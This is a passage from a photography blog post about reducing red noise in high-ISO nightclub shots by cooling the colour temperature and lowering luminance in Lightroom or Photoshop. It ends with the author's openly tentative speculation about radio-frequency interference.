<p>So, what I do is I "cool" the image off a bit. I bring down the color temperature slider, sometimes as low as 4000K. Typically I'm only employing this technique in high-ISO nightclub images, which tend to not utilize flash and the skin tone of any human subjects in the frame is of little concern, i.e. they are already an odd color, so shifting it one way or the other won't destroy the idea of the image. Plus, in RAW you can adjust your other color bands to make up for any shift. Anyways, what I do is I bring our color temp down, until I see the "red" noise minimize itself somewhat.</p>

<p><img class="center" src="https://s3.amazonaws.com/dvblog/lr2.png" width="444" height="230" title="'LR2'" ></p>

<p>And, if that is not sufficient for our needs, I'll turn down the luminance of the affected colors if possible. If this piece is really critical for something, I will actually do the above steps in Photoshop, rather than Lightroom, to allow for more fine control over segments of the image.</p>

<p>Basically, with these steps, I'm minimizing the noise by altering it's appearance and luminosity in the image, which does not destroy the overall sharpness and focus characteristics of the image. Plus, the saturation of desired colors and areas is left alone.</p>

<p>And that's actually kind of it, ya know? I'm not too big into noise reduction. Much like it says on the back of any piece of electronics you own, I just "accept interference from other sources" in my image, and keep moving on to get the photos I want.</p>

<p>Sidebar: Did you know your digital SLR is susceptible to the radio frequency noise present everywhere? And present in huge quantities in a nightclub? Think about it. There's giant speakers with giant magnets mere feet from your camera body. There's massive amounts of electrical energy flowing through poorly-shielded cables. There's hundreds of people, each one with a cell phone on them. There's security guys with radios. There's Wi-Fi network signals, the list goes on. There's a lot of noise pinging about in the club that makes it's way into your camera's guts. It's a miracle it even works sometimes. So yeah, my real advice is to disregard this entire article and just keep shooting. But if you insist on dealing with the noise, I hope this helped. Also, every successive generation of digital SLR technology deals with the noise more effectively. Pretty soon, ISO 6400 will look like ISO 400 does today.</p>

<p>Sidebar 2: I am not qualified in physics or electronic systems as of yet. I might be way off base on some of what is behind all this. I used some of the free knowledge available online to figure out the basics. However, my techniques produce the desired result. So there's that.</p>
]]></content>
  </entry>
  
</feed>
